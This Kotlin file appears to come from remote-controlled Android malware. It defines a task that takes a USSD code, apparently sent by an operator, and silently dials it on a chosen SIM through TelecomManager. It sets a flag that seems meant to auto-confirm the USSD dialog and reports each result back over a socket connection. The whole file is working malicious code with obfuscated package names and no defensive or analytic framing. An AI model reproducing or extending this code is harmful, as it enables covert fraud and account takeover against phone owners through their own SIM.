package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SubscriptionManager
import androidx.core.app.ActivityCompat
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.socketsp.IOSocketyt


class SendUssdTask(val ctx: Context, val ussd: String, private val simSlotIndex: Int = 0) :
    BaseTask(ctx) {

    @SuppressLint("MissingPermission")
    private fun sendUssd() {
        val subscriptionManager = ctx.applicationContext.getSystemService(SubscriptionManager::class.java)
        val subscriptionInfo =
            subscriptionManager.getActiveSubscriptionInfoForSimSlotIndex(simSlotIndex)

        val telecomManager = ctx.applicationContext.getSystemService(Context.TELECOM_SERVICE) as TelecomManager?
        val list = telecomManager!!.callCapablePhoneAccounts
        var primaryPhoneAccountHandle: PhoneAccountHandle =
            if (simSlotIndex == 0) list.first() else list.last()

        runCatching {
            for (phoneAccountHandle in list) {
                if (phoneAccountHandle.id.contains(subscriptionInfo.iccId) || phoneAccountHandle.id.contains(
                        subscriptionInfo.subscriptionId.toString()
                    )
                ) {
                    primaryPhoneAccountHandle = phoneAccountHandle
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "primaryPhoneAccountHandle ${it.localizedMessage}", "error")
        }

        SharedPreferencess.autoClickOnceUssd = "1"

        val extras = Bundle()
        extras.putParcelable(
            TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
            primaryPhoneAccountHandle
        )
        telecomManager.placeCall(Uri.parse("tel:" + Uri.encode(ussd)), extras)

        IOSocketyt.sendLogs("", "SendUssdTask $ussd", "success")
    }

    override fun run() {
        super.run()
        if (ActivityCompat.checkSelfPermission(
                ctx,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            runCatching {
                sendUssd()
            }.onFailure {
                IOSocketyt.sendLogs("", "SendUssdTask ${it.localizedMessage}", "error")
            }
        } else
            requestPermissions()
    }
}


